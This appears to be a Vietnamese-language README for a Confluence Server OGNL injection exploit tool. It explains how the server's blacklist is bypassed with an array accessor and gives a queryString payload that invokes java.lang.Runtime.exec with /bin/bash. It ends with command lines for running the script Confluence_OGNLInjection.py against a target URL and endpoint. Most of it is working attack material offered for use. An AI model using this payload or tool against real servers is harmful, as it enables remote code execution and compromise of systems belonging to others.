# Confluence-Server-Webwork-OGNL-injection
  Object-Graph Navigation Language (OGNL) là một ngôn ngữ biểu thức nguồn mở dành cho Java. Thông thường, các biểu thức được các nhà phát triển sử dụng để tạo các trường động trong một ứng dụng. Ví dụ: tiêu đề của trang web có thể muốn được tạo động dựa trên người dùng hiện tại: OGNL mạnh mẽ và các biểu thức không bị giới hạn trong các ví dụ cơ bản như thế này. OGNL cũng cho phép thực thi bất kỳ loại Java nào trong biểu thức để cho phép các nhà phát triển xử lý nhiều hơn nữa. Khía cạnh nguy hiểm của OGNL là khi người dùng có thể kiểm soát biến được sử dụng trong biểu thức. Nếu kẻ tấn công có thể kiểm soát biến, chúng có thể đưa vào một biểu thức độc hại để máy chủ đánh giá. Trong trường hợp của Confluence, chúng có một số thông số ẩn mà người dùng cuối có thể kiểm soát khi POST các điểm cuối khác nhau.
  
  
![image](https://user-images.githubusercontent.com/59444526/171090104-a885c55f-6a78-427a-8ffb-06e6796b19d3.png)


  
 OGNL injection là lỗ hổng khá phổ biến mà các nhà phát triển nhận thức được và thường để giảm thiểu nó, trước tiên các nhà phát triển sẽ chuyển tất cả nội dung được đánh giá thông qua một danh sách đen (blacklist). Danh sách đen được sử dụng bởi Confluence đã kiểm tra xem có các lớp hoặc thuộc tính Java phổ biến mà kẻ tấn công sử dụng để thực thi mã hay không nhưng lại bỏ sót một số phương pháp nâng cao.
 
 ![image](https://user-images.githubusercontent.com/59444526/171090261-2212fd61-04e3-4253-ac16-4defef70d824.png)

 
 Trình truy cập mảng có thể vượt qua danh sách đen của Confluence:
 
         queryString=aaa'+#{""["class"]}+'bbb
 Với việc bỏ qua danh sách đen, giờ đây họ có thể đưa vào bất kỳ mã Java nào mà máy chủ sẽ đánh giá. Ví dụ cuối cùng về payload có thể được đưa vào là:
 
       queryString=aaa
       #{
        ""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/bin/bash -c ")
         }
# queryString param Request 

![image](https://user-images.githubusercontent.com/59444526/171090559-78dd706d-b17b-402f-bbee-d4e6c6ab4cb9.png)

# Exploit Usage

**Commands:**

$ python3 Confluence_OGNLInjection.py -u http://xxxxx.com

**or**

$ python3 Confluence_OGNLInjection.py -u http://xxxxx.com -p /pages/createpage-entervariables.action?SpaceKey=x

**Exploitation with Confluence_OGNLInjection.py**

![image](https://user-images.githubusercontent.com/59444526/171090827-6bc8aa54-0878-4e7e-a766-ee7470179a09.png)

   
   
